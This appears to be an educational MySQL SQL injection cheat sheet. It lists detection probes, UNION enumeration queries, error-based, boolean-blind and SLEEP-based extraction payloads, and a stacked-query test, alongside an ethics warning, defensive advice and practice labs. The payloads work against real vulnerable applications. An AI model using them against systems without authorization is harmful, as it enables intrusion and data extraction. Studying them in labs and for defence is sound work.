# MySQL — Example SQL Injection Payloads & Notes (Non-destructive, Educational)

> [!WARNING]
> **Ethics reminder:** The examples here are for education and authorized testing only. Never run these against systems you do not own or do not have explicit written permission to test. Prefer intentionally vulnerable labs (PortSwigger Academy, OWASP Juice Shop, DVWA) or local instances.

---

## Contents

* Basic detection probes
* UNION-based examples (non-destructive)
* Error-based examples (safe probes)
* Boolean-based blind examples
* Time-based blind examples
* Stacked-queries considerations in MySQL
* Defensive notes specific to MySQL

---

## 1. Basic detection probes

Simple, low-risk probes to check whether input reaches SQL:

* `'` — single quote to trigger syntax errors if not escaped.
* `"` — double quote depending on context.
* `1 OR 1=1` — logic manipulation (may cause visible changes).

Example HTTP parameter probe:

```
GET /product?id=1'
```

Look for errors like `You have an error in your SQL syntax;` or changes in page content.

---

## 2. UNION-based (non-destructive) examples

Assume an original query: `SELECT id, name, price FROM products WHERE id = 'USER_INPUT'`

### Find column count (safe incremental NULLs)

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

Stop when you no longer get a column-count error.

### Identify display columns

```sql
' UNION SELECT 'COL1', 'COL2', 'COL3' --
```

Observe which markers appear in the response to find reflected columns.

### Non-destructive enumeration examples

Once you know the display column and count, request non-sensitive metadata:

```sql
' UNION SELECT NULL, version(), NULL --
' UNION SELECT NULL, user(), NULL --
' UNION SELECT NULL, database(), NULL --
```

These may reveal DB version and current DB user (useful for fingerprinting).

**Note:** Avoid listing or dumping user data in production. Use lab environments for table/column enumeration.

---

## 3. Error-based (safe probes)

Start with simple syntax errors and type mismatches to fingerprint DBMS and observe behavior.

* Single quote: `'`
* Cast-induced error (example, may or may not reveal content):

```sql
' AND 1=(SELECT CAST(database() AS SIGNED)) --
```

This may cause a conversion error exposing context depending on configuration.

Avoid aggressive error-inducing payloads in live targets.

---

## 4. Boolean-based blind examples

Character extraction pattern (MySQL):

```sql
' AND SUBSTRING((SELECT user()),1,1) = 'r' --
```

Start with `AND 1=1` / `AND 1=2` to confirm the injection works before attempting extraction.

Optimizations:

* Limit character set to `[0-9a-z@._-]` when extracting identifiers or emails.
* Use binary search on ASCII ranges to reduce number of requests.

---

## 5. Time-based blind examples (MySQL)

MySQL function: `SLEEP(seconds)`

### Simple timing check

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

If the response is \~5s slower, timing injections may be possible.

### Character extraction using sleep

```sql
' OR IF(SUBSTRING((SELECT user()),1,1) = 'r', SLEEP(5), 0) --
```

Measure averages and repeat to avoid false positives from network jitter.

---

## 6. Stacked-queries in MySQL

MySQL supports statement separators (`;`) but many client libraries disable multi-statements by default.

### Safe test for multiple-statement support

```sql
' ; SELECT 'X' --
```

If additional statements execute and return results, the connector may allow multiple statements — treat this as high risk.

**Warning:** Do not run destructive stacked payloads (e.g., `; DROP TABLE ...`) — use `SELECT` probes only in discovery.

---

## 7. Useful MySQL-specific functions

* `version()` — DB version string
* `user()` — current DB user
* `database()` — current database name
* `information_schema.tables` and `information_schema.columns` — metadata (requires read access)
* `SLEEP()` — for timing-based blind SQLi
* `CONCAT()`, `CHAR()` — useful constructing strings in payloads

---

## 8. Defensive notes specific to MySQL

> [!NOTE]
> * Use prepared statements / parameterized queries (e.g., `?` placeholders) — they are highly effective.
> * Disable `LOCAL_INFILE`, `LOAD_FILE`, and similar potentially risky features if not required.
> * Ensure the DB user for applications has minimal privileges and cannot access files or execute OS-level commands.
> * Avoid showing full SQL errors in production responses.
> * Monitor for unusual queries against `information_schema` and for long-running queries (suspicious use of `SLEEP`).

---

## 9. Where to practice safely

> [!TIP]
> * PortSwigger Academy (MySQL-focused labs)
> * OWASP Juice Shop
> * DVWA (configure with a local MySQL instance)
> * Local Docker images with intentionally vulnerable apps